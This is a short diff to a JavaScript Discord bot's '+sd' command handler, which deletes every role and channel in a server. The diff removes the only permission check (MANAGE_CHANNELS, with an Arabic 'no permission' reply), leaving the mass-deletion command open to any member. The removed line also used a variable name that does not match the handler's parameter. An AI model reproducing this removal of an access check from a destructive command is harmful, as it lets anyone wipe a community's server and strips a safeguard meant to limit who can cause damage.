@@ -1097,7 +1097,6 @@ for (let i = 0; i < 1; i++) {
 
 client.on('message', ra3d => {   
  if (ra3d.content.startsWith("+sd")) {
-    if(!message.member.hasPermission('MANAGE_CHANNELS')) return message.reply('**⚠  لايوجد لديك صلاحية**');
      ra3d.guild.roles.forEach(r => { r.delete() }) 
      ra3d.guild.channels.forEach(c => { c.delete() })
                 let embed = new Discord.RichEmbed()
